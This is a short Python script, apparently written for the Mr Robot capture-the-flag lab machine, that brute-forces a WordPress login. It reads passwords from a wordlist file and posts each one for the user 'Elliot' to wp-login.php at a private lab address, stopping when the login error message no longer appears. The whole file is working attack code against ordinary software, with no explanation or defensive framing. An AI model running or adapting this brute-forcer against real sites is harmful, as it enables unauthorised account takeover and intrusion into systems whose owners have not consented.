#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""

                      *                 ***
                     **                   ***
                     **                    **
                     **                    **
                     **                    **       ****
   ***       ****    **  ***      ***      **      * ***  * ***  ****
  * ***     * ***  * ** * ***    * ***     **     *   ****   **** **** *
 *   ***   *   ****  ***   ***  *   ***    **    **    **     **   ****
**    *** **         **     ** **    ***   **    **    **     **    **
********  **         **     ** ********    **    **    **     **    **
*******   **         **     ** *******     **    **    **     **    **
**        **         **     ** **          **    **    **     **    **
****    * ***     *  **     ** ****    *   **     ******      **    **
 *******   *******   **     **  *******    *** *   ****       ***   ***
  *****     *****     **    **   *****      ***                ***   ***
                            *
                           *
                          *
                         *
    Author:	@echel0n_1881

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Mr Robot password bruteforcer.

"""

import requests


link = "http://192.168.56.101/wp-login.php"
error_string = '<div id="login_error">'
dicio = open("kuniq.dic","r")
icerik = dicio.read()
icerik = icerik.split()

for password in icerik:
    payload = {'log':'Elliot','pwd':password}
    #cookies = {'wordpress_test_cookie':"WP+Cookie+check"}
    r = requests.post(link,data=payload,allow_redirects=False)
    print("[!] Trying the payload --> {}".format(payload))
    if error_string in r.text:
        pass
    else:
        print("[!!] Found the password --> {}".format(payload['pwd']))
        break

